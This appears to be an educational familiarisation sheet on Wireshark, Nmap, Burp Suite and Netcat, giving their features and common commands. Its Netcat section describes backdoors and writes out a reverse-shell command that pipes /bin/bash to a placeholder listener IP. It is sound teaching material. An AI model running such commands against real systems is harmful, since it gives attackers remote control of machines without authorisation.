# Cybersecurity Tool Familiarization

## 1. Wireshark (Network Protocol Analyzer)
![Wireshark Screenshot](Wireshark.png)

Purpose: Captures and displays packets traveling back and forth on a network in real-time. Used for network troubleshooting, analysis, software and communications protocol development, and education.

*   Key Features:
    *   Packet Capture: Promiscuous mode allows capturing all traffic on the subnet.
    *   Filtering: Powerful display filters (e.g., `ip.addr == 192.168.1.1`, `http`, `tcp.port == 80`).
    *   Stream Follow: Reassemble TCP streams to see the full conversation.
    *   Color Coding: Visual cues for different protocols (Green for TCP, Blue for DNS, etc.).
*   Basic Usage:
    1.  Select the network interface (e.g., `eth0`, `wlan0`).
    2.  Click the blue shark fin to start capturing.
    3.  Apply filters in the top bar to narrow down traffic.
    4.  Right-click a packet -> "Follow" -> "TCP Stream" to read the data payload.

## 2. Nmap (Network Mapper)
![Nmap Screenshot](nmap.png)

Purpose: Open-source utility for network discovery and security auditing. It determines what hosts are available on the network, what services (application name and version) those hosts are offering, and what operating systems they are running.

*   Key Features:
    *   Host Discovery: Identifying live hosts on a network.
    *   Port Scanning: Enumerating open ports.
    *   Version Detection: Determining service/application versions.
    *   OS Detection: Fingerprinting the operating system.
    *   NSE (Nmap Scripting Engine): Automating advanced tasks (vuln scanning, brute force).
*   Common Commands:
    *   `nmap 192.168.1.1`: Basic scan of a single target.
    *   `nmap -sV 192.168.1.1`: Detect service versions.
    *   `nmap -A 192.168.1.1`: Aggressive scan (OS, Version, Scripts, Traceroute).
    *   `nmap -p 1-65535 192.168.1.1`: Scan all ports.

## 3. Burp Suite (Web Vulnerability Scanner)
![Burp Suite Screenshot](Burpsuite.png)

Purpose: An integrated platform for performing security testing of web applications. It acts as a proxy between your browser and the target application.

*   Key Features:
    *   Proxy: Intercepts HTTP/S requests and responses. Allows you to modify data before sending it to the server.
    *   Repeater: Manually manipulate and resend individual requests to test for vulnerabilities.
    *   Intruder: Automates customized attacks (e.g., brute forcing, fuzzing parameters).
    *   Decoder: Encodes/decodes data (URL, Base64, Hex).
*   Basic Usage:
    1.  Configure your browser to proxy traffic through `127.0.0.1:8080`.
    2.  Turn "Intercept On" in Burp Proxy tab.
    3.  Browse the target website; requests will hang in Burp.
    4.  Modify parameters and forward, or send to Repeater (`Ctrl+R`) for testing.

## 4. Netcat (The Swiss Army Knife)
![Netcat Screenshot](Netcat.png)

Purpose: A versatile networking utility which reads and writes data across network connections using the TCP/IP protocol.

*   Key Features:
    *   Port Listening: Can act as a server.
    *   Port Scanning: Can be used as a simple port scanner.
    *   File Transfer: Can send files between machines.
    *   Backdoors: Can create reverse or bind shells.
*   Common Commands:
    *   Connect to a port: `nc <IP> <Port>` (e.g., `nc 192.168.1.5 80`).
    *   Listen on a port: `nc -lvnp <Port>` (Listen, Verbose, Numeric IPs, Port).
    *   File Transfer (Receiver): `nc -lvnp 1234 > output.txt`
    *   File Transfer (Sender): `nc <Receiver_IP> 1234 < input.txt`
    *   Reverse Shell (Listener): `nc -lvnp 4444`
    *   Reverse Shell (Target): `nc <Listener_IP> 4444 -e /bin/bash` (Linux) or `cmd.exe` (Windows).
